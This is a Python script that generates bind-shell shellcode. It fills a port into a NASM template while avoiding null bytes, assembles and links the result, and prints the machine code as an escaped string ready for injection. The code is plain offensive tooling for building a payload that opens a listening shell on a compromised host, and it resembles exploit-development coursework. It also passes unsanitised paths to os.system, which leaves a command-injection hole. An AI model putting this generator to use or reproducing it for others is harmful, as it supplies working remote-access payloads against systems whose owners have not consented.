import os
import sys
import argparse
import traceback
import subprocess


def print_shellcode(object_file_path):

    try:
        command = ["objcopy", "-O", "binary", "-j", ".text", object_file_path, "/dev/stdout"]
        proc = subprocess.run(command, stdout=subprocess.PIPE)
    except:
        print(traceback.format_exc())
        sys.exit(1)
    
    shellcode = proc.stdout
    shellcode_string = ""
    for b in shellcode:
        shellcode_string += f"\\x{b:02x}"

    if 0x00 in shellcode:
        print(f"[!] Found NULL byte in shellcode")

    print(f"[+] Shellcode length: {len(shellcode)} bytes")
    print(f"[+] Shellcode:")
    print(f'"{shellcode_string}";')


def generate_shellcode(output_file_path):

    object_file_path = output_file_path.replace(".nasm", ".o", 1)
    executable_path = output_file_path.replace(".nasm", "", 1)

    try:
        os.system(f"nasm -f elf32 -o {object_file_path} {output_file_path}")
        os.system(f"ld -m elf_i386 -o {executable_path} {object_file_path}")

        print(f"[+] Object file generated at {output_file_path}")
        print(f"[+] Executable binary generated at {executable_path}")

        print_shellcode(object_file_path)
    except:
        print(traceback.format_exc())
        sys.exit(1)

def replace_template_values(template_name, tcp_port, output_file_path):

    with open(template_name) as f:
        template_code = f.read()

    tcp_port_hex = (tcp_port).to_bytes(2, "little").hex()

    if '00' in tcp_port_hex:
        if '00' in tcp_port_hex[:2]:
            non_null_byte = tcp_port_hex[2:]
            replace_code = f"mov bl, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
        else:
            non_null_byte = tcp_port_hex[:2]
            replace_code = f"mov bh, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
    else:
        replace_code = f"push WORD 0x{tcp_port_hex}"
    
    template_code = template_code.replace("{{ TEMPLATE_TCP_PORT }}", replace_code, 1)
    
    with open(output_file_path, 'w') as f:
        f.write(template_code)

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, help='TCP Port for the Bind Shell', required=True, metavar="[1-65535]")
    parser.add_argument('-t', '--template', help='Path of the NASM template file. Example: -t /tmp/template.nasm', required=True)
    parser.add_argument('-o', '--output', help='Path for the output file. Example: -o /tmp/output.nasm', required=True)

    args = parser.parse_args()

    tcp_port = args.port
    if tcp_port not in range(1, 65536):
        print(f"[!] Argument '--port' must be in range [1-65535]")
        sys.exit(1)

    shellcode_template = args.template
    output_file_path = args.output

    replace_template_values(shellcode_template, tcp_port, output_file_path)
    generate_shellcode(output_file_path)


if __name__ == '__main__':

    main()
